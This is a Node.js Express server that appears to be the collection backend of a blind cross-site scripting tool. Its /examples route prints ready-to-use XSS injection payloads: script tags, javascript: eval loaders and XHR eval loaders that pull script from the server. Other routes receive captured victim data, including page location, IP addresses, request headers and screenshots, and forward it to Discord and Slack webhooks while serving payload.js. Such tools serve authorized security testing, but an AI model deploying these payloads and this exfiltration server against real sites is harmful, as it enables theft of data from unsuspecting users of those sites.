const express = require("express");
var bodyParser = require("body-parser");
var cors = require("cors");
const process = require("process");
var request = require("request");
const path = require("path");

// Support local development with .env
require("dotenv").config();

const port = process.env.PORT || 3000;
const imgbb_api_key = process.env.IMGBB_API_KEY || undefined;
const slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK || undefined;
const discord_incoming_webhook = process.env.DISCORD_INCOMING_WEBHOOK || undefined;

const app = express();
app.use(cors());

app.use(bodyParser.json({ limit: "15mb" }));
app.use(bodyParser.urlencoded({ limit: "15mb", extended: true }));

app.use(function (req, res, next) {
    // Headers
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Methods", "GET,POST");
    res.header("Access-Control-Allow-Headers", "Content-Type");
    next();
});

function sendBase64ImageToDiscord(base64Image) {
    try {
        var imageBuffer = Buffer.from(base64Image, "base64");

        request.post({
            url: discord_incoming_webhook,
            formData: {
                file: {
                    value: imageBuffer,
                    options: {
                        filename: "screenshot.png"
                    }
                }
            }
        }, function (error, response, body) {
            if (!error && response.statusCode == 200) {
                console.log('Webhook sent successfully:', body);
            } else {
                console.error('Error sending webhook:', error || body);
            }
        });
    } catch (error) {
        console.error('Error:', error);
    }
}

function generate_blind_xss_alert(body) {
    var alert = "*XSSless: Blind XSS Alert*\n";
    for (let k of Object.keys(body)) {
        if (k === "Screenshot") {
            continue;
        }

        if (body[k] === "") {
            alert += "*" + k + ":* " + "```None```" + "\n";
        } else {
            alert += "*" + k + ":* " + "```" + body[k] + "```" + "\n";
        }
    }
    return alert;
}

function generate_callback_alert(headers, data, url) {
    var alert = "\n:rotating_light: **Out-of-Band Callback Received!**\n\n";
    alert += `**IP Address      |** \`${data["Remote IP"]}\`\n`;
    alert += `**Request URI     |** \`${url}\`\n`;
    alert += `**Raw Headers**\n\`\`\``
  
    for (var key in headers) {
        if (headers.hasOwnProperty(key)) {
            alert += `${key}: ${headers[key]}\n`;
        }
    }
    alert += `\`\`\`\n`;
    return alert;
}

function generate_message_alert(body) {
    var alert = "*XSSless: Message Alert*\n";
    alert += "```\n" + body + "```\n";
    return alert;
}

async function uploadImage(image) {
    // Return new promise
    return new Promise(function (resolve, reject) {
        const options = {
            method: "POST",
            url: "https://api.imgbb.com/1/upload?key=" + imgbb_api_key,
            port: 443,
            headers: {
                "Content-Type": "multipart/form-data",
            },
            formData: {
                image: image,
            },
        };

        // Do async request
        request(options, function (err, imgRes, imgBody) {
            if (err) {
                reject(err);
            } else {
                resolve(imgBody);
            }
        });
    });
}

app.get("/examples", (req, res) => {
    res.header("Content-Type", "text/plain");
    //var url = req.protocol + '://' + req.headers['host']
    var url = "https://" + req.headers["host"];
    var page = "";
    page += `\'"><script src="${url}"></script>\n\n`;
    page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;

    page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;

    page += `<script>$.getScript("${url}")</script>`;
    res.send(page);
    res.end();
});

app.all("/message", (req, res) => {
    var message = req.query.text || req.body.text;
    const alert = generate_message_alert(message);
    data = { form: { payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }) } };
    request.post(discord_incoming_webhook, { form: { username: "XLess", content: alert } }, function (error, response, body) {
        console.log(body);
    });

    request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out) => {
        res.send("ok\n");
        res.end();
    });
});

app.post("/c", async (req, res) => {
    let data = req.body;

    var location = "\n:rocket: **Blind XSS Triggered**\n\n";
    location += `**Location        |** \`${data["Location"]}\`\n`;

    // Upload our screenshot and only then send the Slack alert
    data["Screenshot URL"] = "";


    // Now handle the regular Slack alert
    data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const alert = generate_blind_xss_alert(data);
    data = { form: { payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }) } };

    if (discord_incoming_webhook !== undefined && discord_incoming_webhook != "") {
        request.post(discord_incoming_webhook, { form: { username: "bxss", content: location } }, function (error, response, body) {
            //console.log(body);
            console.log("[!] XSS blind payload triggered! Data sent to discord.\n");
        });
    }

    if (slack_incoming_webhook !== undefined && slack_incoming_webhook != "") {
        request.post(slack_incoming_webhook, data, (out) => {
            console.log("[!] XSS blind payload triggered! Data sent to slack.\n");
        });
    }

    // send screenshot
    if (data["Screenshot"]) {
        console.log("Sending screenshot.\n")
        const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,", "");

        sendBase64ImageToDiscord(encoded_screenshot)
    }

    res.send("ok\n");
    res.end();

});

/**
 * Route to ignore favicon :)
 */
app.get("/favicon*", async (req, res) => {

    res.send("ok");
    res.end();
});

app.all("/*", (req, res) => {
    var headers = req.headers;
    var data = req.body;
    data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const alert = generate_callback_alert(headers, data, req.url);
    data = { form: { payload: JSON.stringify({ username: "BXSS", mrkdwn: true, text: alert }) } };

    if (discord_incoming_webhook !== undefined && discord_incoming_webhook != "") {
        request.post(discord_incoming_webhook, { form: { username: "bxss", content: alert } }, function (error, response, body) {
            //console.log(body);
            console.log("[!] request sent to discord.\n");
        });
    }

    if (slack_incoming_webhook !== undefined && slack_incoming_webhook != "") {
        request.post(slack_incoming_webhook, data, (out) => {
            console.log("[!] request sent to slack.\n");
        });
    }
    res.sendFile(path.join(__dirname + "/payload.js"));
});

app.listen(port, (err) => {
    if (err) throw err;
    console.log(`> Ready On Server http://localhost:${port}`);
});
